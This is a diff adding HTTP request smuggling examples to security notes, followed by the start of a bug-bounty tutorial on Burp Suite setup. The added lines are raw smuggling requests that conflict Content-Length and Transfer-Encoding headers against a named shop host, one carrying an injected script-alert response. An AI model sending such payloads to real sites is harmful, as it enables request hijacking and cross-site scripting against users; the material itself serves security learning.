@@ -2,6 +2,33 @@ HTTP Request Smuggling
 
 
 
+POST /login HTTP/1.1
+Host: shopeasy.com
+Content-Length: 44
+Transfer-Encoding: chunked
+
+0
+
+GET /user-profile HTTP/1.1
+Host: shopeasy.com
+
+
+-----------
+
+
+POST /homepage HTTP/1.1
+Host: shopeasy.com
+Content-Length: 60
+Transfer-Encoding: chunked
+
+0
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+<html><script>alert('You are hacked!');</script></html>
+
+
 Real-World ScenarioSuppose you are participating in a bug bounty program, and you get the opportunity to test an e-commerce website (e.g., example-store.com). Your goal is to investigate whether there is an HTTP request smuggling vulnerability that can cause a discrepancy between the front-end and back-end servers.Step 1: Set Up ToolsInstall Burp Suite and configure it as a proxy in your browser (e.g., Chrome).
 Enable "Intercept" in Burp so that every request and response is visible to you.
 Keep the "Repeater" tab ready to resend and test requests.
